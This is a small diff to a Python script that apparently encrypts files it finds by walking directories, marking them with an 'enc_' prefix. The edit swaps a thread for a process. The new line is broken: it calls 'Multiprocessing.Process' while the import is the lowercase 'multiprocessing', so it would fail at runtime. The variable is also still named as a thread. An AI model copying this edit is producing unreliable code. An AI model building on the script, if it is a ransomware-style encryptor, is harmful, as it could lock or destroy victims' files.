@@ -8,6 +8,7 @@ import threading
 import os
 import sys
 from os import walk
+import multiprocessing
 
 encryption_timeout = 120
 encrypted_symbol = "enc_"
@@ -71,7 +72,7 @@ def StartEncryption():
 
 ###################### main ######################
 
-enc_thread = threading.Thread(target=StartEncryption)
+enc_thread = Multiprocessing.Process(target=StartEncryption)
 enc_thread.daemon = True
 enc_thread.start()
 enc_thread.join(encryption_timeout)
